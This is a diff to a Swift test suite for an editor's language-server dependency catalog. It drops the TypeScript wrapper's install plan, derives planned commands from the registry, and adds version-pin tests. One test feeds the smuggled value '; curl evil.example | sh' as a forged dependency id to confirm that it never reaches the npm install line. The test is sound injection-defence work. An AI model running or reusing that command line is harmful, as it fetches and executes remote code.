@@ -63,6 +63,19 @@ struct LSPServerDependencyTests {
         try #require(LSPServerRegistry.server(forLanguage: "typescript"))
     }
 
+    /// Every command the catalog has a plan for, read off the registry rather
+    /// than listed here.
+    ///
+    /// It used to be a literal pair, and that is how this file broke: the
+    /// TypeScript wrapper's plan was removed — deliberately, because the
+    /// global `typescript` in it collided with the native row — and seven
+    /// tests failed for naming a plan instead of asking for one.
+    private var plannedCommands: [String] {
+        LSPServerRegistry.distinctServers
+            .filter { $0.dependencyPlan != nil }
+            .map(\.command)
+    }
+
     // MARK: The refusal
 
     /// The interesting half is that both names are commands the catalog has a
@@ -107,19 +120,25 @@ struct LSPServerDependencyTests {
         #expect(rust.installCommand == "rustup component add rust-analyzer")
     }
 
-    @Test func theTwoServersThatNeedMoreThanABinaryHavePlans() throws {
+    /// Vue is the one server that needs more than a binary: its own server,
+    /// the tsserver plugin, and the wrapper that loads the plugin.
+    @Test func theServerThatNeedsMoreThanABinaryHasAPlan() throws {
         let vuePlan = try #require(vue().dependencyPlan)
-        let typescriptPlan = try #require(typescript().dependencyPlan)
 
         #expect(vuePlan.packages.map(\.package) == [
             "@vue/language-server",
             "@vue/typescript-plugin",
             "typescript-language-server",
         ])
-        #expect(typescriptPlan.packages.map(\.package) == [
-            "typescript-language-server",
-            "typescript",
-        ])
+    }
+
+    /// And the TypeScript wrapper deliberately does not, which is the whole
+    /// reason its row draws a plain Install: the plan's second package was a
+    /// global `typescript`, and the native TypeScript row installs that same
+    /// package at 7 as *itself*. Installing either row changed the other.
+    @Test func theTypeScriptWrapperHasNoPlan() throws {
+        #expect(try typescript().dependencyPlan == nil)
+        #expect(LSPDependencyCatalog.plan(forCommand: "typescript-language-server") == nil)
     }
 
     /// A plan naming one package twice is not a cosmetic mistake: the status
@@ -127,7 +146,7 @@ struct LSPServerDependencyTests {
     /// traps on a duplicate key, so a typo in the table would crash Settings
     /// rather than draw a repeated row.
     @Test func noPlanNamesAPackageTwice() throws {
-        for command in ["vue-language-server", "typescript-language-server"] {
+        for command in plannedCommands {
             let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
             let ids = plan.packages.map(\.id)
             #expect(Set(ids).count == ids.count, "\(command) names a package twice")
@@ -148,13 +167,14 @@ struct LSPServerDependencyTests {
     /// one and nothing else — the invented string never becomes a word on the
     /// command line.
     @Test func aForgedIdBesideARealOneAddsNoWord() throws {
-        let server = try typescript()
+        let server = try vue()
 
         let command = try #require(
-            server.installCommand(forDependencies: ["typescript", "; curl evil.example | sh"])
+            server.installCommand(
+                forDependencies: ["@vue/typescript-plugin", "; curl evil.example | sh"])
         )
 
-        #expect(command == "npm i -g typescript@6")
+        #expect(command == "npm i -g @vue/typescript-plugin@3.3.10")
         #expect(!command.contains("curl"))
         #expect(!command.contains(";"))
     }
@@ -193,7 +213,7 @@ struct LSPServerDependencyTests {
     /// Every spec in the table is concatenated into a shell line with no
     /// quoting, so the table itself is the thing that has to be safe.
     @Test func everySpecInTheCatalogIsShellSafe() throws {
-        for command in ["vue-language-server", "typescript-language-server"] {
+        for command in plannedCommands {
             let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
             for dependency in plan.packages {
                 #expect(
@@ -232,28 +252,33 @@ struct LSPServerDependencyTests {
         #expect(plugin.spec == "@vue/typescript-plugin@\(pin)")
     }
 
-    /// npm's `latest` for TypeScript is 7, the native rewrite, which ships no
-    /// `tsserver.js` at all — so an unpinned install hands the wrapper nothing
-    /// to drive and it exits during `initialize`.
-    @Test func theWrappersTypeScriptIsPinnedAwayFromTheNativeRewrite() throws {
-        let plan = try #require(typescript().dependencyPlan)
-        let dependency = try #require(plan.packages.first { $0.package == "typescript" })
-
-        #expect(dependency.pin == "6")
-        #expect(dependency.spec == "typescript@6")
-
+    /// The wrapper installs **only itself**, and that is a conflict resolved
+    /// rather than a package forgotten.
+    ///
+    /// It used to install a global `typescript@6` beside itself, pinned because
+    /// npm's `latest` is TypeScript 7 — the native rewrite, which ships no
+    /// `tsserver.js` for a wrapper to drive. The pin was right; the package was
+    /// still wrong to be here. The native row installs `typescript` as
+    /// *itself*, so the two rows fought over one global package and installing
+    /// either changed the other.
+    ///
+    /// What makes dropping it safe is the routing, asserted in
+    /// `TypeScriptRoutingTests`: a file reaches the wrapper only when its
+    /// project has `node_modules/typescript`, and a project without one goes to
+    /// `tsc --lsp` instead.
+    @Test func theWrapperInstallsOnlyItself() throws {
         let server = try typescript()
-        let command = try #require(
-            server.installCommand(forDependencies: Set(plan.packages.map(\.id)))
-        )
-        #expect(command.contains("typescript@6"))
-        #expect(!command.contains("typescript@7"))
+        let command = try #require(server.installCommand)
+
+        #expect(command == "npm i -g typescript-language-server")
+        #expect(!command.contains(" typescript@"))
+        #expect(try #require(server.uninstallCommand) == "npm rm -g typescript-language-server")
     }
 
     /// Two installs at different times must produce the same versions, which
     /// means the spec cannot depend on when it was composed.
     @Test func everyPinnedDependencyCarriesItsPinOnTheSpec() throws {
-        for command in ["vue-language-server", "typescript-language-server"] {
+        for command in plannedCommands {
             let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
             for dependency in plan.packages {
                 guard let pin = dependency.pin else {
@@ -268,7 +293,7 @@ struct LSPServerDependencyTests {
     /// Every dependency has to say when it is needed, because that sentence is
     /// the only thing a screen with no project in context can offer.
     @Test func everyDependencyExplainsWhenItIsNeeded() throws {
-        for command in ["vue-language-server", "typescript-language-server"] {
+        for command in plannedCommands {
             let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
             #expect(!plan.packages.isEmpty)
             for dependency in plan.packages {
@@ -342,24 +367,46 @@ struct LSPServerDependencyTests {
 
     /// A bare major pin is satisfied by any release in it — the point of `@6`
     /// is "not 7", not one particular patch.
-    @Test func aMajorPinAcceptsAnyReleaseInThatMajor() throws {
-        let plan = try #require(typescript().dependencyPlan)
+    /// A pin of `6` means any 6.x, where a pin of `6.0.1` means exactly that.
+    ///
+    /// Built here rather than taken from the table, and the reason is worth
+    /// stating: the only major pin the table ever had was the TypeScript
+    /// wrapper's `typescript@6`, and it left with that plan. The branch is
+    /// still reachable by any future plan, so it keeps a subject.
+    @Test func aMajorPinAcceptsAnyReleaseInThatMajor() {
+        let major = LSPServerDependency(
+            package: "example",
+            pin: "6",
+            purpose: "fixture",
+            presence: .globalPackage)
 
         for version in ["6.0.0", "6.4.2", "6.9.10"] {
-            let statuses = LSPDependencyCatalog.statuses(
-                for: plan,
-                installedCommands: ["typescript-language-server"],
-                globalVersions: ["typescript": version]
-            )
-            #expect(statuses["typescript"] == .present, "\(version) should satisfy @6")
+            #expect(major.satisfies(version: version), "\(version) should satisfy @6")
         }
+        #expect(!major.satisfies(version: "7.0.2"))
+        #expect(!major.satisfies(version: "5.9.0"))
+    }
 
-        let seven = LSPDependencyCatalog.statuses(
-            for: plan,
-            installedCommands: ["typescript-language-server"],
-            globalVersions: ["typescript": "7.0.2"]
-        )
-        #expect(seven["typescript"] == .outdated(installed: "7.0.2"))
+    @Test func anExactPinMeansExactly() {
+        let exact = LSPServerDependency(
+            package: "example",
+            pin: "3.3.10",
+            purpose: "fixture",
+            presence: .globalPackage)
+
+        #expect(exact.satisfies(version: "3.3.10"))
+        #expect(!exact.satisfies(version: "3.3.11"))
+    }
+
+    /// No pin accepts whatever is installed, which is what makes a package
+    /// this app does not version-manage read as present rather than outdated.
+    @Test func noPinAcceptsAnything() {
+        let loose = LSPServerDependency(
+            package: "example",
+            purpose: "fixture",
+            presence: .globalPackage)
+
+        #expect(loose.satisfies(version: "0.0.1"))
     }
 
     // MARK: What the popover ticks
@@ -459,15 +506,18 @@ struct LSPServerDependencyTests {
         #expect(versions.isEmpty)
     }
 
-    /// The probe asks for each package once, however many plans name it —
-    /// `typescript-language-server` is in both.
+    /// The probe asks for each package once, however many plans name it.
+    ///
+    /// `typescript` is deliberately **not** among them any more: it left with
+    /// the TypeScript wrapper's plan, because the native TypeScript row
+    /// installs that package as itself.
     @Test func theProbeAsksForEachPackageOnce() {
         let packages = LSPDependencyCatalog.allPackages
 
         #expect(Set(packages).count == packages.count)
         #expect(packages.contains("@vue/typescript-plugin"))
-        #expect(packages.contains("typescript"))
         #expect(packages.contains("typescript-language-server"))
+        #expect(!packages.contains("typescript"))
     }
 
     private func write(package: String, version: String, under root: URL) throws {
